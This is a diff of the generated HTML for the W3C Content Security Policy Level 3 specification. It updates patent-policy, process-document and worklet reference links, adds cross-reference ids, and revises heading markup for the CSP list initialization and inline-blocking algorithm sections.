@@ -1560,11 +1966,11 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
 	“[CSP3] <em>…summary of comment…</em>” </p>
    <p> This document was produced by the <a href="https://www.w3.org/2011/webappsec/">Web Application Security Working Group</a>. </p>
    <p> This document was produced by a group operating under
-	the <a href="https://www.w3.org/Consortium/Patent-Policy/">W3C Patent Policy</a>.
+	the <a href="https://www.w3.org/Consortium/Patent-Policy-20170801/">W3C Patent Policy</a>.
 	W3C maintains a <a href="https://www.w3.org/2004/01/pp-impl/49309/status" rel="disclosure">public list of any patent disclosures</a> made in connection with the deliverables of the group;
 	that page also includes instructions for disclosing a patent.
-	An individual who has actual knowledge of a patent which the individual believes contains <a href="https://www.w3.org/Consortium/Patent-Policy/#def-essential">Essential Claim(s)</a> must disclose the information in accordance with <a href="https://www.w3.org/Consortium/Patent-Policy/#sec-Disclosure">section 6 of the W3C Patent Policy</a>. </p>
-   <p> This document is governed by the <a href="https://www.w3.org/2019/Process-20190301/" id="w3c_process_revision">1 March 2019 W3C Process Document</a>. </p>
+	An individual who has actual knowledge of a patent which the individual believes contains <a href="https://www.w3.org/Consortium/Patent-Policy-20170801/#def-essential">Essential Claim(s)</a> must disclose the information in accordance with <a href="https://www.w3.org/Consortium/Patent-Policy-20170801/#sec-Disclosure">section 6 of the W3C Patent Policy</a>. </p>
+   <p> This document is governed by the <a href="https://www.w3.org/2020/Process-20200915/" id="w3c_process_revision">15 September 2020 W3C Process Document</a>. </p>
    <p></p>
   </div>
   <div data-fill-with="at-risk">
@@ -2010,7 +2416,7 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
       <p>The <code>report-uri</code> directive is deprecated in favor of the new <code>report-to</code> directive, which relies on <a data-link-type="biblio" href="#biblio-reporting">[REPORTING]</a> as infrastructure.</p>
      <li data-md>
       <p>The <code>'strict-dynamic'</code> source expression will now allow script which
-  executes on a page to load more script via non-<a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" id="ref-for-parser-inserted">"parser-inserted"</a> <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script">script</a></code> elements. Details are in <a href="#strict-dynamic-usage">§ 8.2 Usage of "'strict-dynamic'"</a>.</p>
+  executes on a page to load more script via non-<a data-link-type="dfn">"parser-inserted"</a> <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script">script</a></code> elements. Details are in <a href="#strict-dynamic-usage">§ 8.2 Usage of "'strict-dynamic'"</a>.</p>
      <li data-md>
       <p>The <code>'unsafe-hashes'</code> source expression will now allow event
   handlers, style attributes and <code>javascript:</code> navigation targets to match
@@ -2051,7 +2457,7 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
 </pre>
     <h3 class="heading settled" data-level="2.2" id="framework-policy"><span class="secno">2.2. </span><span class="content">Policies</span><a class="self-link" href="#framework-policy"></a></h3>
     <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-local-lt="policy" data-lt="content security policy object" id="content-security-policy-object">policy</dfn> defines allowed
-  and restricted behaviors, and may be applied to a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①">Document</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope">WorkerGlobalScope</a></code>, or <code class="idl"><a data-link-type="idl" href="https://drafts.css-houdini.org/worklets/#workletglobalscope" id="ref-for-workletglobalscope">WorkletGlobalScope</a></code> as described in <a href="#initialize-global-object-csp">§ 4.2.2 Initialize a global object’s CSP list</a> and in <a href="#initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a>.</p>
+  and restricted behaviors, and may be applied to a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①">Document</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope">WorkerGlobalScope</a></code>, or <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope">WorkletGlobalScope</a></code> as described in <a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp">§ 4.2.2 Initialize a global object’s CSP list</a> and in <a href="#initialize-document-csp" id="ref-for-initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a>.</p>
     <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-directive-set">directive set</dfn>, which is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set">ordered
   set</a> of <a data-link-type="dfn" href="#directives" id="ref-for-directives">directives</a> that define the policy’s implications when applied.</p>
     <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-disposition">disposition</dfn>, which is either
@@ -2059,10 +2465,10 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
     <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-source">source</dfn>, which is either "<code>header</code>"
   or "<code>meta</code>".</p>
     <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-self-origin">self-origin</dfn>, which
-  is an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin" id="ref-for-concept-origin">origin</a> that is used when matching the <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self"><code>'self'</code></a> keyword.</p>
+  is an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/infrastructure.html#concept-request-origin" id="ref-for-concept-request-origin">origin</a> that is used when matching the <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self"><code>'self'</code></a> keyword.</p>
     <p class="note" role="note"><span>Note:</span> This is needed to facilitate the <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①"><code>'self'</code></a> checks of <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme①">local scheme</a> documents/workers that have inherited their policy but
   have an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin-opaque" id="ref-for-concept-origin-opaque">opaque origin</a>. Most of the time this will simply be the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object" id="ref-for-environment-settings-object">environment settings object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin" id="ref-for-concept-settings-object-origin">origin</a>.
-  The <a href="#initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a> algorithm describes situations in which
+  The <a href="#initialize-document-csp" id="ref-for-initialize-document-csp①">§ 4.2.1 Initialize a Document's CSP list</a> algorithm describes situations in which
   a policy is inherited.</p>
     <p>Multiple <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object">policies</a> can be applied to a single resource, and are collected into a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list" id="ref-for-list">list</a> of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①">policies</a> known as a <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="csp-list">CSP list</dfn>.</p>
     <p>A <a data-link-type="dfn" href="#csp-list" id="ref-for-csp-list">CSP list</a> <dfn data-dfn-type="dfn" data-export id="contains-a-header-delivered-content-security-policy">contains a header-delivered Content Security Policy<a class="self-link" href="#contains-a-header-delivered-content-security-policy"></a></dfn> if it <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain">contains</a> a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②">policy</a> whose <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source">source</a> is "<code>header</code>".</p>
@@ -2169,22 +2575,22 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
      <li data-md>
       <p>An <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-inline-check">inline check</dfn>, which takes an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element">Element</a></code>, a
   type string, a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⓪">policy</a>, and a source string as arguments,
-  and is executed during <a href="#should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> and during <a href="#should-block-navigation-request">§ 4.2.5 Should navigation request of type be blocked
+  and is executed during <a href="#should-block-inline" id="ref-for-should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> and during <a href="#should-block-navigation-request" id="ref-for-should-block-navigation-request">§ 4.2.5 Should navigation request of type be blocked
     by Content Security Policy?</a> for <code>javascript:</code> requests. This
   algorithm returns "<code>Allowed</code>" unless otherwise specified.</p>
      <li data-md>
-      <p>An <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-initialization">initialization</dfn>, which takes a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document②">Document</a></code> or <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object">global object</a>, a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②">response</a>, and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①①">policy</a> as arguments. This algorithm is executed during <a href="#initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a>,
+      <p>An <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-initialization">initialization</dfn>, which takes a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document②">Document</a></code> or <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object">global object</a>, a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②">response</a>, and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①①">policy</a> as arguments. This algorithm is executed during <a href="#initialize-document-csp" id="ref-for-initialize-document-csp②">§ 4.2.1 Initialize a Document's CSP list</a>,
   and has no effect unless otherwise specified.</p>
      <li data-md>
       <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-pre-navigation-check">pre-navigation check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③">request</a>, a navigation type string ("<code>form-submission</code>"
   or "<code>other</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①②">policy</a> as arguments, and
-  is executed during <a href="#should-block-navigation-request">§ 4.2.5 Should navigation request of type be blocked
+  is executed during <a href="#should-block-navigation-request" id="ref-for-should-block-navigation-request①">§ 4.2.5 Should navigation request of type be blocked
     by Content Security Policy?</a>. It returns
   "<code>Allowed</code>" unless otherwise specified.</p>
      <li data-md>
       <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-navigation-response-check">navigation response check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④">request</a>, a navigation type string ("<code>form-submission</code>" or "<code>other</code>"),
   a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③">response</a>, a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#browsing-context" id="ref-for-browsing-context">browsing context</a>, a check type string ("<code>source</code>"
-  or "<code>response</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①③">policy</a> as arguments, and is executed during <a href="#should-block-navigation-response">§ 4.2.6 Should navigation response to navigation request of type
+  or "<code>response</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①③">policy</a> as arguments, and is executed during <a href="#should-block-navigation-response" id="ref-for-should-block-navigation-response">§ 4.2.6 Should navigation response to navigation request of type
     in target be blocked by Content Security Policy?</a>. It returns "<code>Allowed</code>" unless otherwise specified.</p>
     </ol>
     <h4 class="heading settled" data-level="2.3.1" id="framework-directive-source-list"><span class="secno">2.3.1. </span><span class="content">Source Lists</span><a class="self-link" href="#framework-directive-source-list"></a></h4>
@@ -2392,7 +2798,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
 <pre class="highlight"><c- p>&lt;</c-><c- f>meta</c-> <c- e>http-equiv</c-><c- o>=</c-><c- s>"Content-Security-Policy"</c-> <c- e>content</c-><c- o>=</c-><c- s>"script-src 'self'"</c-><c- p>></c->
 </pre>
     </div>
-    <p>Implementation details can be found in HTML’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv-content-security-policy" id="ref-for-attr-meta-http-equiv-content-security-policy">Content Security Policy
+    <p>Implementation details can be found in HTML’s <a data-link-type="dfn">Content Security Policy
   state</a> <code>http-equiv</code> processing instructions <a data-link-type="biblio" href="#biblio-html">[HTML]</a>.</p>
     <p class="note" role="note"><span>Note:</span> The <a data-link-type="http-header" href="#header-content-security-policy-report-only" id="ref-for-header-content-security-policy-report-only②"><code>Content-Security-Policy-Report-Only</code></a> header is <em>not</em> supported inside a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta③">meta</a></code> element. Neither are the <code>report-uri</code>, <code>frame-ancestors</code>, and <code>sandbox</code> directives.</p>
     <p>Authors are <em>strongly encouraged</em> to place <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta④">meta</a></code> elements as early
@@ -2566,24 +2972,24 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
     <h3 class="heading settled" data-level="4.2" id="html-integration"><span class="secno">4.2. </span><span class="content"> Integration with HTML </span><a class="self-link" href="#html-integration"></a></h3>
     <ol>
      <li data-md>
-      <p>The <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document④">Document</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope①">WorkerGlobalScope</a></code>, and <code class="idl"><a data-link-type="idl" href="https://drafts.css-houdini.org/worklets/#workletglobalscope" id="ref-for-workletglobalscope①">WorkletGlobalScope</a></code> objects have a <code>CSP list</code>, which holds all the <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②③">policy</a> objects which are
+      <p>The <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document④">Document</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope①">WorkerGlobalScope</a></code>, and <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope①">WorkletGlobalScope</a></code> objects have a <code>CSP list</code>, which holds all the <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②③">policy</a> objects which are
   active for a given context. This list is empty unless otherwise specified,
-  and is populated via the <a href="#initialize-global-object-csp">§ 4.2.2 Initialize a global object’s CSP list</a> and <a href="#initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a> algorithms.</p>
+  and is populated via the <a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp①">§ 4.2.2 Initialize a global object’s CSP list</a> and <a href="#initialize-document-csp" id="ref-for-initialize-document-csp③">§ 4.2.1 Initialize a Document's CSP list</a> algorithms.</p>
      <li data-md>
       <p>A <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑦">global object</a>’s <dfn class="dfn-paneled" data-dfn-for="global object" data-dfn-type="dfn" data-noexport id="global-object-csp-list">CSP list</dfn> is the result of executing <a href="#get-csp-of-object">§ 4.2.3 Retrieve the CSP list of an object</a> with the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑧">global object</a> as the <code>object</code>.</p>
      <li data-md>
       <p>A <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②④">policy</a> is <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="enforced">enforced</dfn> or <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="monitored">monitored</dfn> for a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑨">global object</a> by inserting it into the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①⓪">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list④">CSP list</a>.</p>
      <li data-md>
-      <p><a href="#initialize-global-object-csp">§ 4.2.2 Initialize a global object’s CSP list</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/workers.html#run-a-worker" id="ref-for-run-a-worker">run a worker</a> algorithm in order to bind a set of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑤">policy</a> objects associated
-  with a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①③">response</a> <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope②">WorkerGlobalScope</a></code> or <code class="idl"><a data-link-type="idl" href="https://drafts.css-houdini.org/worklets/#workletglobalscope" id="ref-for-workletglobalscope②">WorkletGlobalScope</a></code>.</p>
+      <p><a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp②">§ 4.2.2 Initialize a global object’s CSP list</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/workers.html#run-a-worker" id="ref-for-run-a-worker">run a worker</a> algorithm in order to bind a set of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑤">policy</a> objects associated
+  with a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①③">response</a> <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope②">WorkerGlobalScope</a></code> or <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope②">WorkletGlobalScope</a></code>.</p>
      <li data-md>
-      <p><a href="#initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a> is called during the <a data-link-type="dfn">initializing a
+      <p><a href="#initialize-document-csp" id="ref-for-initialize-document-csp④">§ 4.2.1 Initialize a Document's CSP list</a> is called during the <a data-link-type="dfn">initializing a
   new <code>Document</code> object</a> algorithm in order to bind a set of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑥">policy</a> objects associated with a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①④">response</a> to a newly created <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑤">Document</a></code>.</p>
      <li data-md>
-      <p><a href="#should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#prepare-a-script" id="ref-for-prepare-a-script">prepare a script</a> and <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block" id="ref-for-update-a-style-block">update a <code>style</code> block</a> algorithms in order to determine whether or
+      <p><a href="#should-block-inline" id="ref-for-should-block-inline①">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#prepare-a-script" id="ref-for-prepare-a-script">prepare a script</a> and <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block" id="ref-for-update-a-style-block">update a <code>style</code> block</a> algorithms in order to determine whether or
   not an inline script or style block is allowed to execute/render.</p>
      <li data-md>
-      <p><a href="#should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> is called during handling of inline event
+      <p><a href="#should-block-inline" id="ref-for-should-block-inline②">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> is called during handling of inline event
   handlers (like <code>onclick</code>) and inline <code>style</code> attributes in order to
   determine whether or not they ought to be allowed to execute/render.</p>
      <li data-md>
@@ -2597,7 +3003,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
       <p class="issue" id="issue-5599665e"><a class="self-link" href="#issue-5599665e"></a> Stylesheet loading is not yet integrated with
   Fetch in WHATWG’s HTML. <a href="https://github.com/whatwg/html/issues/968">&lt;https://github.com/whatwg/html/issues/968></a></p>
      <li data-md>
-      <p><a href="#allow-base-for-document">§ 6.2.1.1 Is base allowed for document?</a> is called during <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element">base</a></code>'s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url" id="ref-for-set-the-frozen-base-url">set the frozen
+      <p><a href="#allow-base-for-document" id="ref-for-allow-base-for-document">§ 6.2.1.1 Is base allowed for document?</a> is called during <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element">base</a></code>'s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url" id="ref-for-set-the-frozen-base-url">set the frozen
   base URL</a> algorithm to ensure that the <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href" id="ref-for-attr-base-href">href</a></code> attribute’s value
   is valid.</p>
      <li data-md>
@@ -2605,14 +3011,14 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
     Security Policy?:</a> is called during the processing of <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element">object</a></code>, <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element">embed</a></code>, and <a data-link-type="dfn"><code>applet</code></a> elements to determine whether they may trigger a fetch.</p>
       <p class="note" role="note"><span>Note:</span> Fetched plugin resources are handled in <a href="#should-block-response">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>.</p>
      <li data-md>
-      <p><a href="#should-block-navigation-request">§ 4.2.5 Should navigation request of type be blocked
+      <p><a href="#should-block-navigation-request" id="ref-for-should-block-navigation-request②">§ 4.2.5 Should navigation request of type be blocked
     by Content Security Policy?</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsing-the-web.html#process-a-navigate-fetch" id="ref-for-process-a-navigate-fetch">process a
-  navigate fetch</a> algorithm, and <a href="#should-block-navigation-response">§ 4.2.6 Should navigation response to navigation request of type
+  navigate fetch</a> algorithm, and <a href="#should-block-navigation-response" id="ref-for-should-block-navigation-response①">§ 4.2.6 Should navigation response to navigation request of type
     in target be blocked by Content Security Policy?</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsing-the-web.html#process-a-navigate-response" id="ref-for-process-a-navigate-response">process a navigate response</a> algorithm to
   apply directive’s navigation checks, as well as inline checks for
   navigations to <code>javascript:</code> URLs.</p>
     </ol>
-    <h4 class="heading settled algorithm" data-algorithm="Initialize a Document&apos;s CSP list" data-level="4.2.1" id="initialize-document-csp"><span class="secno">4.2.1. </span><span class="content"> Initialize a <code>Document</code>'s <code>CSP list</code> </span><a class="self-link" href="#initialize-document-csp"></a></h4>
+    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Initialize a Document&apos;s CSP list" data-dfn-type="dfn" data-export data-level="4.2.1" data-lt="Initialize a Document&apos;s CSP list" id="initialize-document-csp"><span class="secno">4.2.1. </span><span class="content"> Initialize a <code>Document</code>'s <code>CSP list</code> </span><a class="self-link" href="#initialize-document-csp" id="ref-for-initialize-document-csp⑤"></a></h4>
     <p>Given a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑨">Document</a></code> (<var>document</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑤">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①③">request</a> or <code>null</code> (<var>request</var>) the user agent performs the following
   steps in order to initialize <var>document</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/dom.html#concept-document-csp-list" id="ref-for-concept-document-csp-list">CSP list</a>:</p>
     <ol>
@@ -2647,7 +3053,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
         </ol>
       </ol>
     </ol>
-    <h4 class="heading settled algorithm" data-algorithm="Initialize a global object’s CSP list" data-level="4.2.2" id="initialize-global-object-csp"><span class="secno">4.2.2. </span><span class="content"> Initialize a global object’s <code>CSP list</code> </span><a class="self-link" href="#initialize-global-object-csp"></a></h4>
+    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Initialize a global object’s CSP list" data-dfn-type="dfn" data-export data-level="4.2.2" data-lt="Initialize a global object’s CSP list" id="initialize-global-object-csp"><span class="secno">4.2.2. </span><span class="content"> Initialize a global object’s <code>CSP list</code> </span><a class="self-link" href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp③"></a></h4>
     <p>Given a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①①">global object</a> (<var>global</var>), and a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑥">response</a> (<var>response</var>), the user agent performs the following steps in order
   to initialize <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑥">CSP list</a>:</p>
     <ol>
@@ -2678,10 +3084,10 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
         <p>For each <var>policy</var> in <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-csp-list" id="ref-for-concept-response-csp-list⑨">CSP list</a>, insert <var>policy</var> into <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑨">CSP list</a>.</p>
       </ol>
      <li data-md>
-      <p>If <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://drafts.css-houdini.org/worklets/#workletglobalscope" id="ref-for-workletglobalscope③">WorkletGlobalScope</a></code>:</p>
+      <p>If <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope③">WorkletGlobalScope</a></code>:</p>
       <ol>
        <li data-md>
-        <p>Let <var>owner</var> be <var>global</var>’s <a data-link-type="dfn" href="https://drafts.css-houdini.org/worklets/#workletglobalscope-owner-document" id="ref-for-workletglobalscope-owner-document">owner document</a>.</p>
+        <p>Let <var>owner</var> be <var>global</var>’s <a data-link-type="dfn" href="https://www.w3.org/TR/worklets-1/#workletglobalscope-owner-document" id="ref-for-workletglobalscope-owner-document">owner document</a>.</p>
        <li data-md>
         <p>For each <var>policy</var> in <var>owner</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⓪">CSP list</a>:</p>
         <ol>
@@ -2700,11 +3106,11 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
      <li data-md>
       <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope③">WorkerGlobalScope</a></code>, return <var>object</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①④">CSP list</a>.</p>
      <li data-md>
-      <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://drafts.css-houdini.org/worklets/#workletglobalscope" id="ref-for-workletglobalscope④">WorkletGlobalScope</a></code>, return <var>object</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑤">CSP list</a>.</p>
+      <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope④">WorkletGlobalScope</a></code>, return <var>object</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑤">CSP list</a>.</p>
      <li data-md>
       <p>Return <code>null</code>.</p>
     </ol>
-    <h4 class="heading settled algorithm" data-algorithm="Should element’s inline type behavior be blocked by Content Security Policy?" data-level="4.2.4" id="should-block-inline"><span class="secno">4.2.4. </span><span class="content"> Should <var>element</var>’s inline <var>type</var> behavior be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-inline"></a></h4>
+    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should element’s inline type behavior be blocked by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.2.4" data-lt="Should element’s inline type behavior be blocked by Content Security Policy?" id="should-block-inline"><span class="secno">4.2.4. </span><span class="content"> Should <var>element</var>’s inline <var>type</var> behavior be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-inline" id="ref-for-should-block-inline③"></a></h4>
